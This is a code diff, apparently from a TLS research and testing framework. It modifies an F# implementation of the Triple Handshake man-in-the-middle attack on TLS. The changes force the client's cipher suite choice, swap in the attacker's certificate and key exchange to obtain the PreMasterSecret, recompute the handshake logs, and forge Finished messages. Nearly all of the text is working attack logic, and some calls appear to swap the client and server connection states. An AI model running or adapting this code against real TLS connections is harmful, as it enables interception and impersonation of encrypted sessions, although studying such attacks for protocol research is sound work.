@@ -49,15 +49,18 @@ type Attack_TripleHandshake =
         // Start being a client
         let cst,_   = FlexConnection.clientOpenTcpConnection(server_name,cn=server_name,port=port) in
         
-        //BB TODO : Modify the received client hello to only authorize RSA ciphersuites
-        let cst     = FlexHandshake.send(cst,sch.payload) in
-        
+        // Override the honest client hello message with our preferences
+        // Access to the honest client random
+        let asch         = { sch with suites = [TLS_DHE_RSA_WITH_AES_128_GCM_SHA256]; ext = []; } in
+        let cst,nsc,cch = FlexClientHello.send(cst,asch) in
+
         // Forward server hello but check that the choosen ciphersuite is RSA
-        let cst,nsc,ssh   = FlexServerHello.receive(cst,sch,nsc) in
+        // Access to the honest server random
+        let cst,nsc,ssh   = FlexServerHello.receive(cst,asch,nsc) in
         if not (TLSConstants.isRSACipherSuite (TLSConstants.cipherSuite_of_name ssh.suite)) then
             failwith "Triple Handshake demo only implemented for RSA key exchange"
         else
-        let sst = FlexHandshake.send(sst,ssh.payload) in
+        let sst,nsc,ssh   = FlexServerHello.send(sst,asch,nsc) in
 
         // Discard the real certificate of the server and inject ours instead
         let cst,cnsc,ccert = FlexCertificate.receive(cst,Client,nsc) in
@@ -67,6 +70,7 @@ type Attack_TripleHandshake =
         let cst,sst,shdpayload  = FlexHandshake.forward(cst,sst) in
 
         // Discard the real the client key exchange and inject ours instead
+        // Access to the PreMasterSecret
         let sst,snsc,sfcke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch) in
         let cst,cnsc,cfcke  = FlexClientKeyExchange.sendRSA(cst,cnsc,sch) in
 
@@ -79,7 +83,7 @@ type Attack_TripleHandshake =
 
         // Compute the log of the handshake
         let slog      = sch.payload @| ssh.payload @| scert.payload @| shdpayload @| sfcke.payload in
-        let clog      = sch.payload @| ssh.payload @| ccert.payload @| shdpayload @| cfcke.payload in
+        let clog      = asch.payload @| ssh.payload @| ccert.payload @| shdpayload @| cfcke.payload in
 
         // Discard the real the finished message and inject ours instead
         let sst,sff   = FlexFinished.receive(sst,logRoleNSC=(slog,Client,snsc)) in
@@ -97,8 +101,12 @@ type Attack_TripleHandshake =
         let clog      = clog @| cff.payload in
 
         // Discard the real the finished message and inject ours instead
-        let cst,cff       = FlexFinished.receive(sst,logRoleNSC=(clog,Server,cnsc)) in
-        let sst,sff       = FlexFinished.send(cst,logRoleNSC=(slog,Server,snsc)) in
+        let cst,cff   = FlexFinished.receive(sst,logRoleNSC=(clog,Server,cnsc)) in
+        let sst,sff   = FlexFinished.send(cst,logRoleNSC=(slog,Server,snsc)) in
+
+        // End of the first handshake
+        Tcp.close cst.ns;
+        Tcp.close sst.ns;
         ()
 
     end
